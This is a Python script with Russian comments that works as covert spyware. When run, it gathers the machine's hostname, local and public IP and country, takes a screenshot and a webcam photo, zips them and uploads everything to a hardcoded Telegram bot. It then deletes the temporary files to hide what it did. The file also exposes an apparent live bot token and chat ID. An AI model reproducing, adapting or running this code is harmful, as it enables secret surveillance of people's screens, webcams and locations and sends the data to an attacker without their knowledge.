import requests
import socket
import pyautogui
import os
import tempfile
import random
import string
import cv2
import datetime
import zipfile

# Токен вашего бота и ID чата
BOT_TOKEN = "7785202195:AAGBPO2by0Kg0uxZd70wF3aDeY-67U6905Q"
CHAT_ID = "6154104101"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        return response.json().get("ip")
    except Exception as e:
        return f"Не удалось получить IP: {e}"

def get_country_by_ip(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        country = data.get("country", "Неизвестно")
        return country
    except Exception as e:
        return "Не удалось определить страну"

def create_zip(folder_path, zip_name):
    # Создание архива с папкой
    zip_path = folder_path + ".zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), folder_path))
    return zip_path

def send_to_telegram(message, zip_path):
    # Отправка текста в Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"Ошибка отправки текста: {e}")
    
    # Отправка архива с файлами
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(zip_path, 'rb') as doc:
        data = {"chat_id": CHAT_ID}
        files = {'document': doc}
        try:
            requests.post(url, data=data, files=files)
        except Exception as e:
            print(f"Ошибка отправки архива: {e}")

def take_screenshot():
    screenshot = pyautogui.screenshot()
    
    # Генерация случайного имени файла
    random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '.png'
    temp_dir = tempfile.gettempdir()  # Временная директория
    screenshot_path = os.path.join(temp_dir, random_filename)
    
    screenshot.save(screenshot_path)
    return screenshot_path

def take_webcam_photo():
    # Попытка захватить фото с веб-камеры
    webcam_image_path = None
    cap = cv2.VideoCapture(0)
    
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            webcam_image_path = os.path.join(tempfile.gettempdir(), ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '.jpg')
            cv2.imwrite(webcam_image_path, frame)
    
    cap.release()
    return webcam_image_path

def create_info_file(info, folder_path):
    # Создание текстового файла с информацией
    info_path = os.path.join(folder_path, "info.txt")
    with open(info_path, "w") as f:
        f.write(info)

if __name__ == "__main__":
    # Получаем локальный и публичный IP
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    public_ip = get_public_ip()

    # Получаем страну по публичному IP
    country = get_country_by_ip(public_ip)

    # Время запуска программы
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Формируем сообщение
    message = f"Устройство запущено:\nВремя запуска: {current_time}\nЛокальный IP: {local_ip}\nПубличный IP: {public_ip}\nСтрана: {country}"

    # Создаем временную папку для файлов
    folder_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    folder_path = os.path.join(tempfile.gettempdir(), folder_name)
    os.makedirs(folder_path)

    # Делаем скриншот
    screenshot_path = take_screenshot()
    # Делаем фото с веб-камеры, если камера доступна
    webcam_image_path = take_webcam_photo()

    # Сохраняем фотографии в папку
    os.rename(screenshot_path, os.path.join(folder_path, "screenshot.png"))
    if webcam_image_path:
        os.rename(webcam_image_path, os.path.join(folder_path, "webcam_photo.jpg"))

    # Создаем текстовый файл с информацией
    info = f"Время запуска: {current_time}\nЛокальный IP: {local_ip}\nПубличный IP: {public_ip}\nСтрана: {country}"
    create_info_file(info, folder_path)

    # Создаем архив с папкой
    zip_path = create_zip(folder_path, folder_path)

    # Отправляем сообщение и архив в Telegram
    send_to_telegram(message, zip_path)

    # Удаляем временные файлы
    os.remove(zip_path)
    os.rmdir(folder_path)
